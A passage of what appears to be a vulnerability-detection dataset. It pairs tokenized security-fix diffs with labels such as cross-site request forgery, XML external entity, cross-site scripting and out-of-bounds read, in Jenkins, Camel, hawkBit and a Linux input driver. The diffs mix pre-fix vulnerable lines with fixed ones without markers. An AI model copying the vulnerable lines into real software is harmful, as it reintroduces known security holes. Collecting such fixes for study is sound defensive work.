"RECORDER_VALIDATION_RETRY_COUNT_NAN", "(", "))", ";", "}", "@", "RequirePOST", "public", "FormValidation", "doTestDynatraceConnection", "(", "@", "QueryParameter", "(", "\"", "protocol", "\"", ")", "final", "String", "protocol", ",", "@", "QueryParameter", "(", "\"", "host", "\"", ")", "final", "String", "host", ",", "@", "@", "-", "132", ",", "10", "+", "132", ",", "6", "@", "@", "private", "void", "addPreviousBuildReport", "(", ")", "{", "previousReport", "=", "prevBuildAction", ".", "getCurrentReport", "(", ");", "}", "/", "**", "*", "Custom", "message", "format", "method", ".", "Used", "in", "jelly", "script", "to", "be", "able", "to", "resolve", "externalized", "strings", "only", "once", "per", "request", ".", "*", "It", "significantly", "improves", "performance", "in", "old", "Jenkins", "versions", "but", "code", "is", "a", "bit", "less", "clear", ".", "*", "/", "public", "static", "String", "formatMessage", "(", "String", "pattern", ",", "Object", "argument", ")", "{", "return", "MessageFormat", ".", "format", "(", "pattern", ",", "argument", ")", ";", "}", "@", "@", "-", "62", ",", "7", "+", "62", ",", "7", "@", "@", "*", "Created", "by", "krzysztof", ".", "necel", "on", "2016", "-", "02", "-", "05", ".", "*", "@", "author", "piotr", ".", "lugowski", "*", "/", "public", "class", "TAReportingProjectAction", "implements", "Action", "{", "public", "class", "TAReportingProjectAction", "implements", "Action", "{", "private", "static", "final", "String", "URL_NAME", "=", "\"", "dynatrace", "-", "test", "-", "result", "-", "trend", "\"", ";", "@", "@", "-", "75", ",", "9", "+", "75", ",", "9", "@", "@", "private", "static", "final", "Color", "COLOR_IMPROVED", "=", "new", "Color", "(", "0x00a6fb", ")", ";", "private", "static", "final", "Color", "COLOR_VOLATILE", "=", "new", "Color", "(", "0xffe11c", ")", ";", "private", "abstract", "class", "GraphImpl", "extends", "Graph", "{", "private", "abstract", "static", "class", "GraphImpl", "extends", "Graph", "{", "protected", "GraphImpl", "(", ")", "{", "GraphImpl", "(", ")", "{", "super", "(", "-", "1", ",", "500", ",", "300", ")", ";", "/", "/", "cannot", "use", "timestamp", ",", "since", "ranges", "may", "change", "}", "@", "@", "-", "114", ",", "7", "+", "114", ",", "7", "@", "@", "protected", "JFreeChart", "createGraph", "(", ")", "{", "categoryaxis", ".", "setCategoryMargin", "(", "0", ".", "0D", ")", ";", "categoryaxis", ".", "setCategoryLabelPositions", "(", "CategoryLabelPositions", ".", "UP_90", ")", ";", "/", "/", "KN", ":", "force", "the", "chart", "axis", "to", "have", "only", "integer", "values", "/", "/", "force", "the", "chart", "axis", "to", "have", "only", "integer", "values", "plot", ".", "getRangeAxis", "(", ").", "setStandardTickUnits", "(", "NumberAxis", ".", "createIntegerTickUnits", "(", "))", ";", "return", "chart", ";", "@", "@", "-", "123", ",", "6", "+", "123", ",", "7", "@", "@", "protected", "JFreeChart", "createGraph", "(", ")", "{", "private", "final", "Job", "<", "?,", "?", ">", "project", ";", "@", "SuppressWarnings", "(", "\"", "WeakerAccess", "\"", ")", "public", "TAReportingProjectAction", "(", "Job", "<", "?,", "?>", "project", ")", "{", "this", ".", "project", "=", "project", ";", "}", "@", "@", "-", "148", ",", "14", "+", "149", ",", "18", "@", "@", "public", "String", "getUrlName", "(", ")", "{", "/", "**", "*", "Generates", "graph", "with", "the", "number", "of", "tests", "executed", "in", "each", "category", "for", "{", "@", "link", "#", "MAX_BUILD_NUMBER_TO_SHOW_ON_CHART", "}", "latest", "builds", ".", "*", "*", "@", "param", "request", "request", "sent", "to", "generate", "the", "graph", "*", "@", "param", "response", "response", "to", "modify", "(", "if", "needed", ")", "*", "@", "throws", "IOException", "when", "PNG", "file", "creation", "was", "not", "possible", "*", "/", "public", "void", "doSummarizerGraph", "(", "final", "StaplerRequest", "request", ",", "final", "StaplerResponse", "response", ")", "throws", "IOException", "{", "final", "Map", "<", "ChartUtil", ".", "NumberOnlyBuildLabel", ",", "Map", "<", "TestStatus", ",", "Integer", ">", ">", "summaries", "=", "new", "TreeMap", "<", ">(", ");", "List", "<", "TAReport", ">", "reports", "=", "getExistingReportsList", "(", "MAX_BUILD_NUMBER_TO_SHOW_ON_CHART", ")", ";", "for", "(", "TAReport", "report", ":", "reports", ")", "{", "Map", "<", "TestStatus", ",", "Integer", ">", "summary", "=", "report", ".", "getSummary", "(", ");", "summaries", ".", "put", "(", "new", "ChartUtil", ".", "NumberOnlyBuildLabel", "(", "(", "Run", "<", "?,", "?", ">)", "report", ".", "getBuild", "(", "))", ",", "summary", ")", ";", "summaries", ".", "put", "(", "new", "ChartUtil", ".", "NumberOnlyBuildLabel", "(", "report", ".", "getBuild", "(", "))", ",", "summary", ")", ";", "}", "final", "Graph", "graph", "=", "new", "GraphImpl", "(", ")", "{", "@", "@", "-", "200", ",", "7", "+", "205", ",", "8", "@", "@", "protected", "CategoryDataset", "createDataSet", "(", ")", "{", "if", "(", "buildAction", "!", "=", "null", ")", "{", "report", "=", "buildAction", ".", "getCurrentReport", "(", ");", "}", "else", "{", "/", "/", "KN", ":", "FOR", "BACKWARD", "COMPATIBILITY", "}", "else", "{", "/", "/", "backward", "compatibility", "report", "=", "UtilsCompat", ".", "getCompatReport", "(", "currentBuild", ")", ";", "}", "@", "@", "-", "50", ",", "11", "+", "50", ",", "6", "@", "@", "private", "static", "AbstractBuild", "<", "?,", "?", ">", "currentBuild", "=", "null", ";", "private", "TestAutomationReport", "currentReport", ";", "/", "**", "*", "Parses", "the", "reports", "and", "build", "a", "{", "@", "link", "TestAutomationBuildActionResultsDisplay", "}", ".", "*", "*", "@", "throws", "java", ".", "io", ".", "IOException", "If", "a", "report", "fails", "to", "parse", ".", "*", "/", "public", "TestAutomationBuildActionResultsDisplay", "(", "final", "TestAutomationBuildAction", "buildAction", ",", "TaskListener", "listener", ")", "throws", "IOException", "{", "this", ".", "buildAction", "=", "buildAction", ";", "@", "@", "-", "35", ",", "6", "+", "35", ",", "8", "@", "@", "import", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "BasicServerConfiguration", ";", "import", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "DynatraceClient", ";", "import", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautomation", ".", "models", ".", "TestRuns", ";", "import", "com", ".", "google", ".", "common", ".", "collect", ".", "ImmutableList", ";", "import", "hudson", ".", "model", ".", "Run", ";", "import", "hudson", ".", "model", ".", "ParameterValue", ";", "import", "hudson", ".", "model", ".", "Result", ";", "@", "@", "-", "49", ",", "7", "+", "51", ",", "7", "@", "@", "*", "Created", "by", "krzysztof", ".", "necel", "on", "2016", "-", "01", "-", "25", ".", "*", "/", "public", "final", "class", "Utils", "{", "public", "static", "final", "String", "TEST_MEASURE_UNIT_DEFAULT", "=", "\"", "num", "\"", ";", "private", "static", "final", "String", "TEST_MEASURE_UNIT_DEFAULT", "=", "\"", "num", "\"", ";", "public", "static", "final", "String", "DYNATRACE_ICON_24_X_24_FILEPATH", "=", "\"", "/", "plugin", "/", "dynatrace", "-", "dashboard", "/", "images", "/", "dynatrace_icon_24x24", ".", "png", "\"", ";", "public", "static", "final", "String", "DYNATRACE_ICON_48_X_48_FILEPATH", "=", "\"", "/", "plugin", "/", "dynatrace", "-", "dashboard", "/", "images", "/", "dynatrace_icon_48x48", ".", "png", "\"", ";", "@", "@", "-", "63", ",", "7", "+", "65", ",", "7", "@", "@", "public", "static", "DynatraceClient", "createClient", "(", ")", "{", "final", "TAGlobalConfiguration", "globalConfig", "=", "GlobalConfiguration", ".", "all", "(", ").", "get", "(", "TAGlobalConfiguration", ".", "class", ")", ";", "if", "(", "globalConfig", "!", "=", "null", ")", "{", "BasicServerConfiguration", "config", "=", "new", "BasicServerConfiguration", "(", "globalConfig", ".", "username", ",", "globalConfig", ".", "password", ",", "globalConfig", ".", "password", ".", "getPlainText", "(", "),", "globalConfig", ".", "protocol", ".", "startsWith", "(", "\"", "https", "\"", "),", "globalConfig", ".", "host", ",", "globalConfig", ".", "port", ",", "@", "@", "-", "99", ",", "15", "+", "101", ",", "15", "@", "@", "public", "static", "TestRun", "convertTestRun", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautomation", ".", "mod", "return", "new", "TestRun", "(", "testResults", ",", "testRunSummary", ",", "sdkTestRun", ".", "getId", "(", "),", "convertTestCategory", "(", "sdkTestRun", ".", "getCategory", "(", "))", ");", "}", "public", "static", "TestResult", "convertTestResult", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautomation", ".", "models", ".", "TestResult", "sdkTestResult", ")", "{", "private", "static", "TestResult", "convertTestResult", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautomation", ".", "models", ".", "TestResult", "sdkTestResult", ")", "{", "Set", "<", "TestMeasure", ">", "measures", "=", "new", "HashSet", "<", ">(", ");", "for", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautomation", ".", "models", ".", "TestMeasure", "sdkMeasure", ":", "sdkTestResult", ".", "getMeasures", "(", "))", "{", "measures", ".", "add", "(", "convertTestMeasure", "(", "sdkMeasure", ")", ");", "}", "return", "new", "TestResult", "(", "sdkTestResult", ".", "getExecutionTime", "(", "),", "sdkTestResult", ".", "getName", "(", "),", "sdkTestResult", ".", "getPackageName", "(", "),", "sdkTestResult", ".", "getPlatform", "(", "),", "convertTestStatus", "(", "sdkTestResult", ".", "getStatus", "(", "))", ",", "measures", ")", ";", "}", "public", "static", "TestMeasure", "convertTestMeasure", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautomation", ".", "models", ".", "TestMeasure", "sdkTestMeasure", ")", "{", "private", "static", "TestMeasure", "convertTestMeasure", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautomation", ".", "models", ".", "TestMeasure", "sdkTestMeasure", ")", "{", "String", "unit", "=", "sdkTestMeasure", ".", "getUnit", "(", ")", "!", "=", "null", "?", "sdkTestMeasure", ".", "getUnit", "(", ")", ":", "TEST_MEASURE_UNIT_DEFAULT", ";", "return", "new", "TestMeasure", "(", "sdkTestMeasure", ".", "getName", "(", "),", "sdkTestMeasure", ".", "getMetricGroup", "(", "),", "@", "@", "-", "118", ",", "7", "+", "120", ",", "7", "@", "@", "public", "static", "TestMeasure", "convertTestMeasure", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautoma", "sdkTestMeasure", ".", "getViolationPercentage", "(", "))", ";", "}", "public", "static", "TestCategory", "convertTestCategory", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautomation", ".", "models", ".", "TestCategory", "sdkTestCategory", ")", "{", "private", "static", "TestCategory", "convertTestCategory", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautomation", ".", "models", ".", "TestCategory", "sdkTestCategory", ")", "{", "switch", "(", "sdkTestCategory", ")", "{", "case", "UNIT", ":", "return", "TestCategory", ".", "UNIT", ";", "@", "@", "-", "132", ",", "7", "+", "134", ",", "7", "@", "@", "public", "static", "TestCategory", "convertTestCategory", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testauto", "throw", "new", "IllegalArgumentException", "(", "\"", "Could", "not", "convert", "TestCategory", "\"", ");", "}", "public", "static", "TestStatus", "convertTestStatus", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautomation", ".", "models", ".", "TestStatus", "sdkTestStatus", ")", "{", "private", "static", "TestStatus", "convertTestStatus", "(", "com", ".", "dynatrace", ".", "sdk", ".", "server", ".", "testautomation", ".", "models", ".", "TestStatus", "sdkTestStatus", ")", "{", "return", "TestStatus", ".", "valueOf", "(", "sdkTestStatus", ".", "name", "(", "))", ";", "}", "@", "@", "-", "158", ",", "6", "+", "160", ",", "7", "@", "@", "public", "static", "String", "formatDoublePercentage", "(", "Double", "d", ")", "{", "return", "d", "=", "=", "null", "?", "FORMAT_DOUBLE_NULL_VALUE", ":", "DECIMAL_FORMAT", ".", "format", "(", "d", "*", "100", ")", ";", "}", "@", "SuppressWarnings", "(", "\"", "BooleanMethodIsAlwaysInverted", "\"", ")", "public", "static", "boolean", "isValidBuild", "(", "Run", "build", ",", "PrintStream", "logger", ",", "String", "message", ")", "{", "if", "(", "build", ".", "getResult", "(", ")", "=", "=", "Result", ".", "ABORTED", ")", "{", "logger", ".", "println", "(", "\"", "Build", "has", "been", "aborted", "-", "\"", "+", "message", ")", ";", "@", "@", "-", "181", ",", "6", "+", "184", ",", "6", "@", "@", "public", "static", "void", "updateBuildVariables", "(", "Run", "<", "?,", "?", ">", "build", ",", "List", "<", "ParameterValue", ">", "pa", "}", "public", "static", "void", "updateBuildVariable", "(", "Run", "<", "?,", "?", ">", "build", ",", "String", "key", ",", "String", "value", ")", "{", "updateBuildVariables", "(", "build", ",", "Collections", ".", "<", "ParameterValue", ">", "singletonList", "(", "new", "StringParameterValue", "(", "key", ",", "value", ")", "))", ";", "updateBuildVariables", "(", "build", ",", "ImmutableList", ".", "of", "(", "new", "StringParameterValue", "(", "key", ",", "value", ")", "))", ";", "}", "}"], "docstring_tokens": ["cross-site", "request", "forgery"]}
{"contents": ["CAMEL-12444:", "Improved", "DTD", "handling", "in", "validator", "component."], "code_tokens": ["@", "@", "-", "175", ",", "6", "+", "175", ",", "7", "@", "@", "protected", "SchemaFactory", "createSchemaFactory", "(", ")", "{", "}", "if", "(", "camelContext", "=", "=", "null", "|", "|", "!", "Boolean", ".", "parseBoolean", "(", "camelContext", ".", "getGlobalOptions", "(", ").", "get", "(", "ACCESS_EXTERNAL_DTD", ")", "))", "{", "try", "{", "LOG", ".", "debug", "(", "\"", "Configuring", "SchemaFactory", "to", "not", "allow", "access", "to", "external", "DTD", "/", "Schema", "\"", ");", "factory", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "}", "catch", "(", "SAXException", "e", ")", "{", "LOG", ".", "warn", "(", "e", ".", "getMessage", "(", "),", "e", ")", ";", "@", "@", "-", "22", ",", "6", "+", "22", ",", "7", "@", "@", "import", "java", ".", "net", ".", "URL", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "javax", ".", "xml", ".", "XMLConstants", ";", "import", "javax", ".", "xml", ".", "parsers", ".", "ParserConfigurationException", ";", "import", "javax", ".", "xml", ".", "transform", ".", "Result", ";", "import", "javax", ".", "xml", ".", "transform", ".", "Source", ";", "@", "@", "-", "53", ",", "6", "+", "54", ",", "8", "@", "@", "import", "org", ".", "slf4j", ".", "Logger", ";", "import", "org", ".", "slf4j", ".", "LoggerFactory", ";", "import", "static", "org", ".", "apache", ".", "camel", ".", "processor", ".", "validation", ".", "SchemaReader", ".", "ACCESS_EXTERNAL_DTD", ";", "/", "**", "*", "A", "processor", "which", "validates", "the", "XML", "version", "of", "the", "inbound", "message", "body", "*", "against", "some", "schema", "either", "in", "XSD", "or", "RelaxNG", "@", "@", "-", "100", ",", "6", "+", "103", ",", "16", "@", "@", "protected", "void", "doProcess", "(", "Exchange", "exchange", ")", "throws", "Exception", "{", "}", "Validator", "validator", "=", "schema", ".", "newValidator", "(", ");", "/", "/", "turn", "off", "access", "to", "external", "schema", "by", "default", "if", "(", "!", "Boolean", ".", "parseBoolean", "(", "exchange", ".", "getContext", "(", ").", "getGlobalOptions", "(", ").", "get", "(", "ACCESS_EXTERNAL_DTD", ")", "))", "{", "try", "{", "LOG", ".", "debug", "(", "\"", "Configuring", "Validator", "to", "not", "allow", "access", "to", "external", "DTD", "/", "Schema", "\"", ");", "validator", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_DTD", ",", "\"", "\")", ";", "validator", ".", "setProperty", "(", "XMLConstants", ".", "ACCESS_EXTERNAL_SCHEMA", ",", "\"", "\")", ";", "}", "catch", "(", "SAXException", "e", ")", "{", "LOG", ".", "warn", "(", "e", ".", "getMessage", "(", "),", "e", ")", ";", "}", "}", "/", "/", "the", "underlying", "input", "stream", ",", "which", "we", "need", "to", "close", "to", "avoid", "locking", "files", "or", "other", "resources", "Source", "source", "=", "null", ";"], "docstring_tokens": ["xml", "external", "entity"]}
{"contents": ["Fixes", "#1067", "JSON", "body", "response", "for", "HTTP", "404", "error", "may", "contain", "unsafe", "URL", "path", "characters.", "Thus", "removing", "path", "from", "the", "response", "Signed-off-by:", "Dominic", "Schabel", "<dominic.schabel@bosch.io>"], "code_tokens": ["@", "@", "-", "8", ",", "6", "+", "8", ",", "8", "@", "@", "*", "/", "package", "org", ".", "eclipse", ".", "hawkbit", ".", "app", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletRequest", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletResponse", ";", "@", "@", "-", "23", ",", "22", "+", "25", ",", "23", "@", "@", "/", "**", "*", "Error", "page", "controller", "that", "ensures", "that", "ocet", "stream", "does", "not", "return", "text", "in", "*", "case", "of", "an", "error", ".", "*", "*", "/", "@", "Controller", "/", "/", "Exception", "squid", ":", "S3752", "-", "errors", "need", "handling", "for", "all", "methods", "@", "SuppressWarnings", "(", "\"", "squid", ":", "S3752", "\"", ")", "public", "class", "StreamAwareErrorController", "extends", "BasicErrorController", "{", "public", "class", "ErrorController", "extends", "BasicErrorController", "{", "private", "static", "final", "String", "PATH", "=", "\"", "path", "\"", ";", "/", "**", "*", "A", "new", "{", "@", "link", "StreamAwareErrorController", "}", ".", "*", "A", "new", "{", "@", "link", "ErrorController", "}", ".", "*", "*", "@", "param", "errorAttributes", "*", "the", "error", "attributes", "*", "@", "param", "serverProperties", "*", "configuration", "properties", "*", "/", "public", "StreamAwareErrorController", "(", "final", "ErrorAttributes", "errorAttributes", ",", "final", "ServerProperties", "serverProperties", ")", "{", "public", "ErrorController", "(", "final", "ErrorAttributes", "errorAttributes", ",", "final", "ServerProperties", "serverProperties", ")", "{", "super", "(", "errorAttributes", ",", "serverProperties", ".", "getError", "(", "))", ";", "}", "@", "@", "-", "48", ",", "4", "+", "51", ",", "19", "@", "@", "public", "StreamAwareErrorController", "(", "final", "ErrorAttributes", "errorAttributes", ",", "final", "S", "return", "new", "ResponseEntity", "<", ">(", "status", ")", ";", "}", "@", "Override", "@", "RequestMapping", "public", "ResponseEntity", "<", "Map", "<", "String", ",", "Object", ">", ">", "error", "(", "final", "HttpServletRequest", "request", ")", "{", "final", "HttpStatus", "status", "=", "getStatus", "(", "request", ")", ";", "final", "Map", "<", "String", ",", "Object", ">", "body", "=", "getErrorAttributesWithoutPath", "(", "request", ")", ";", "return", "new", "ResponseEntity", "<", ">(", "body", ",", "status", ")", ";", "}", "private", "Map", "<", "String", ",", "Object", ">", "getErrorAttributesWithoutPath", "(", "final", "HttpServletRequest", "request", ")", "{", "final", "Map", "<", "String", ",", "Object", ">", "body", "=", "getErrorAttributes", "(", "request", ",", "isIncludeStackTrace", "(", "request", ",", "MediaType", ".", "ALL", ")", ");", "if", "(", "body", "!", "=", "null", "&", "&", "body", ".", "containsKey", "(", "PATH", ")", ")", "{", "body", ".", "remove", "(", "PATH", ")", ";", "}", "return", "body", ";", "}", "}"], "docstring_tokens": ["cross-site", "scripting"]}
{"contents": ["Input:", "gtco", "-", "fix", "potential", "out-of-bound", "access", "parse_hid_report_descriptor()", "has", "a", "while", "(i", "<", "length)", "loop,", "which", "only", "guarantees", "that", "there's", "at", "least", "1", "byte", "in", "the", "buffer,", "but", "the", "loop", "body", "can", "read", "multiple", "bytes", "which", "causes", "out-of-bounds", "access.", "Reported-by:", "Andrey", "Konovalov", "<andreyknvl@google.com>", "Reviewed-by:", "Andrey", "Konovalov", "<andreyknvl@google.com>", "Cc:", "stable@vger.kernel.org", "Signed-off-by:", "Dmitry", "Torokhov", "<dmitry.torokhov@gmail.com>"], "code_tokens": ["@", "@", "-", "230", ",", "22", "+", "230", ",", "25", "@", "@", "static", "void", "parse_hid_report_descriptor", "(", "struct", "gtco", "*", "device", ",", "char", "*", "report", ",", "/", "*", "Walk", "this", "report", "and", "pull", "out", "the", "info", "we", "need", "*", "/", "while", "(", "i", "<", "length", ")", "{", "prefix", "=", "report", "[", "i", "]", ";", "/", "*", "Skip", "over", "prefix", "*", "/", "i", "+", "+;", "prefix", "=", "report", "[", "i", "+", "+]", ";", "/", "*", "Determine", "data", "size", "and", "save", "the", "data", "in", "the", "proper", "variable", "*", "/", "size", "=", "PREF_SIZE", "(", "prefix", ")", ";", "size", "=", "(", "1U", "<", "<", "PREF_SIZE", "(", "prefix", ")", ")", ">", ">", "1", ";", "if", "(", "i", "+", "size", ">", "length", ")", "{", "dev_err", "(", "ddev", ",", "\"", "Not", "enough", "data", "(", "need", "%", "d", ",", "have", "%", "d", ")", "\\", "n", "\"", ",", "i", "+", "size", ",", "length", ")", ";", "break", ";", "}", "switch", "(", "size", ")", "{", "case", "1", ":", "data", "=", "report", "[", "i", "]", ";", "break", ";", "case", "2", ":", "data16", "=", "get_unaligned_le16", "(", "&", "report", "[", "i", "]", ");", "break", ";", "case", "3", ":", "size", "=", "4", ";", "case", "4", ":", "data32", "=", "get_unaligned_le32", "(", "&", "report", "[", "i", "]", ");", "break", ";", "}"], "docstring_tokens": ["out-of-bounds", "read"]}
{"contents": ["[SECURITY-1072]"], "code_tokens": ["@", "@", "-", "1", ",", "19", "+", "1", ",", "19", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2012", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Erik", "Ramfelt", ",", "*", "Tom", "Huybrechts", ",", "Vincent", "Latombe", "*", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2018", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Erik", "Ramfelt", ",", "*", "Tom", "Huybrechts", ",", "Vincent", "Latombe", ",", "CloudBees", ",", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "@", "@", "-", "40", ",", "44", "+", "40", ",", "35", "@", "@", "import", "hudson", ".", "model", ".", "listeners", ".", "SaveableListener", ";", "import", "hudson", ".", "security", ".", "ACL", ";", "import", "hudson", ".", "security", ".", "AccessControlled", ";", "import", "hudson", ".", "security", ".", "Permission", ";", "import", "hudson", ".", "security", ".", "SecurityRealm", ";", "import", "hudson", ".", "security", ".", "UserMayOrMayNotExistException", ";", "import", "hudson", ".", "util", ".", "FormApply", ";", "import", "hudson", ".", "util", ".", "FormValidation", ";", "import", "hudson", ".", "util", ".", "RunList", ";", "import", "hudson", ".", "util", ".", "XStream2", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "FileFilter", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "nio", ".", "file", ".", "DirectoryStream", ";", "import", "java", ".", "nio", ".", "file", ".", "Files", ";", "import", "java", ".", "nio", ".", "file", ".", "InvalidPathException", ";", "import", "java", ".", "nio", ".", "file", ".", "Path", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "Collections", ";", "import", "java", ".", "util", ".", "Comparator", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "Iterator", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "Objects", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ConcurrentHashMap", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ConcurrentMap", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ExecutionException", ";", "import", "java", ".", "util", ".", "concurrent", ".", "locks", ".", "ReadWriteLock", ";", "import", "java", ".", "util", ".", "concurrent", ".", "locks", ".", "ReentrantReadWriteLock", ";", "import", "java", ".", "util", ".", "logging", ".", "Level", ";", "import", "java", ".", "util", ".", "logging", ".", "Logger", ";", "import", "javax", ".", "annotation", ".", "CheckForNull", ";", "import", "javax", ".", "annotation", ".", "Nonnull", ";", "import", "javax", ".", "annotation", ".", "Nullable", ";", "import", "javax", ".", "annotation", ".", "concurrent", ".", "GuardedBy", ";", "import", "javax", ".", "servlet", ".", "ServletException", ";", "import", "javax", ".", "servlet", ".", "http", ".", "HttpServletResponse", ";", "import", "jenkins", ".", "model", ".", "IdStrategy", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "jenkins", ".", "model", ".", "ModelObjectWithContextMenu", ";", "@", "@", "-", "92", ",", "7", "+", "83", ",", "6", "@", "@", "import", "org", ".", "acegisecurity", ".", "providers", ".", "anonymous", ".", "AnonymousAuthenticationToken", ";", "import", "org", ".", "acegisecurity", ".", "userdetails", ".", "UserDetails", ";", "import", "org", ".", "acegisecurity", ".", "userdetails", ".", "UsernameNotFoundException", ";", "import", "org", ".", "apache", ".", "commons", ".", "io", ".", "filefilter", ".", "DirectoryFileFilter", ";", "import", "org", ".", "apache", ".", "commons", ".", "lang", ".", "StringUtils", ";", "import", "org", ".", "jenkinsci", ".", "Symbol", ";", "import", "org", ".", "kohsuke", ".", "accmod", ".", "Restricted", ";", "@", "@", "-", "130", ",", "12", "+", "120", ",", "47", "@", "@", "*", "is", "explicitly", "invoked", "(", "perhaps", "as", "a", "result", "of", "a", "browser", "submitting", "a", "*", "configuration", ".", ")", "*", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "@", "ExportedBean", "public", "class", "User", "extends", "AbstractModelObject", "implements", "AccessControlled", ",", "DescriptorByNameOwner", ",", "Saveable", ",", "Comparable", "<", "User", ">", ",", "ModelObjectWithContextMenu", ",", "StaplerProxy", "{", "public", "static", "final", "XStream2", "XSTREAM", "=", "new", "XStream2", "(", ");", "private", "static", "final", "Logger", "LOGGER", "=", "Logger", ".", "getLogger", "(", "User", ".", "class", ".", "getName", "(", "))", ";", "static", "final", "String", "CONFIG_XML", "=", "\"", "config", ".", "xml", "\"", ";", "/", "**", "*", "Escape", "hatch", "for", "StaplerProxy", "-", "based", "access", "control", "*", "/", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "public", "static", "/", "*", "Script", "Console", "modifiable", "*", "/", "boolean", "SKIP_PERMISSION_CHECK", "=", "Boolean", ".", "getBoolean", "(", "User", ".", "class", ".", "getName", "(", ")", "+", "\"", ".", "skipPermissionCheck", "\"", ");", "/", "**", "*", "Jenkins", "now", "refuses", "to", "let", "the", "user", "login", "if", "he", "/", "she", "doesn", "'", "t", "exist", "in", "{", "@", "link", "SecurityRealm", "}", ",", "*", "which", "was", "necessary", "to", "make", "sure", "users", "removed", "from", "the", "backend", "will", "get", "removed", "from", "the", "frontend", ".", "*", "<", "p", ">", "*", "Unfortunately", "this", "infringed", "some", "legitimate", "use", "cases", "of", "creating", "Jenkins", "-", "local", "users", "for", "*", "automation", "purposes", ".", "This", "escape", "hatch", "switch", "can", "be", "enabled", "to", "resurrect", "that", "behaviour", ".", "*", "<", "p", ">", "*", "@", "see", "<", "a", "href", "=", "\"", "https", ":", "//", "issues", ".", "jenkins", "-", "ci", ".", "org", "/", "browse", "/", "JENKINS", "-", "22346", "\"", ">", "JENKINS", "-", "22346", "<", "/", "a", ">", ".", "*", "/", "public", "static", "boolean", "ALLOW_NON_EXISTENT_USER_TO_LOGIN", "=", "SystemProperties", ".", "getBoolean", "(", "User", ".", "class", ".", "getName", "(", ")", "+", "\"", ".", "allowNonExistentUserToLogin", "\"", ");", "/", "**", "*", "Jenkins", "historically", "created", "a", "(", "usually", ")", "ephemeral", "user", "record", "when", "an", "user", "with", "Overall", "/", "Administer", "permission", "*", "accesses", "a", "/", "user", "/", "arbitraryName", "URL", ".", "*", "<", "p", ">", "*", "Unfortunately", "this", "constitutes", "a", "CSRF", "vulnerability", ",", "as", "malicious", "users", "can", "make", "admins", "create", "arbitrary", "numbers", "*", "of", "ephemeral", "user", "records", ",", "so", "the", "behavior", "was", "changed", "in", "Jenkins", "2", ".", "TODO", "/", "2", ".", "32", ".", "2", ".", "*", "<", "p", ">", "*", "As", "some", "users", "may", "be", "relying", "on", "the", "previous", "behavior", ",", "setting", "this", "to", "true", "restores", "the", "previous", "behavior", ".", "This", "*", "is", "not", "recommended", ".", "*", "<", "p", ">", "*", "SECURITY", "-", "406", ".", "*", "/", "@", "Restricted", "(", "NoExternalUse", ".", "class", ")", "public", "static", "boolean", "ALLOW_USER_CREATION_VIA_URL", "=", "SystemProperties", ".", "getBoolean", "(", "User", ".", "class", 